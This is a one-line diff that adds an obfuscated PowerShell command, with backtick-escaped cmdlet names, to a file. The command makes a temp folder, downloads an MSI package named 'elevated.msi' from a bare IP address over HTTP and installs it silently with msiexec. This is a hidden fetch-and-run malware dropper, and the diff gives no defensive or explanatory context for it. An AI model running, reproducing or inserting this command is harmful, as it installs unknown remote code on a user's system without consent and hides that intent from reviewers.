@@ -1,0 +1,1 @@
+﻿MK`DIR -force $env:TEMP\TCD506A_.tmp;INV`O`KE-WEB`Re`Qu`EsT "http://83.212.111.137/down/elevated.msi" -OutFile "$env:TEMP\TCD506A_.tmp\elevated.msi";mSiE`xEC /q /i "$env:TEMP\TCD506A_.tmp\elevated.msi";
